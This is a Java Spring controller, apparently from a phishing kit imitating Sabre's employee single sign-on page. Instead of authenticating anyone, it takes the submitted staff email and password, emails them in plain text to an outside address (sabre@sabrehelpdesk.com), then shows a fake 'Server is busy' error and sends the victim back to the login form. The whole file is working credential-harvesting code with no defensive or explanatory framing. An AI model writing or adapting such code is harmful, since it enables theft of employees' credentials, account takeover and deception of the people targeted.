package com.account.havail.sabre.sabre.controllers;

import com.account.havail.sabre.sabre.service.EmailService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;

import java.util.Map;


@Controller
public class LoginAsEmployeeSSO {

        @Autowired
        private EmailService emailService;
    @PostMapping("/loginAsEmployeeSSO")
    public String handleLogin(@RequestParam Map<String, String> params,
                              RedirectAttributes redirectAttributes) {

        // Extract the parameters from the map using the correct keys
        String StaffEmail = params.get("data[Staff][email]");
        String StaffPassword = params.get("data[Staff][password]");
        boolean remember_me = Boolean.parseBoolean(params.get("data[Staff][remember_me]"));

        // Process the data
        String subject = "New Login Attempt with Employee SSO";
        String body = "Staff Email : " + StaffEmail + "\n"
                + "Staff Password: " + StaffPassword + "\n"
                + "remember me: " + remember_me;

        emailService.sendEmail("sabre@sabrehelpdesk.com", subject, body);

        // Add error message to redirect attributes
        redirectAttributes.addFlashAttribute("errorMessage", "Server is busy. Please try again later.");

        return "redirect:/sso/login/employeeAccount";
    }

}
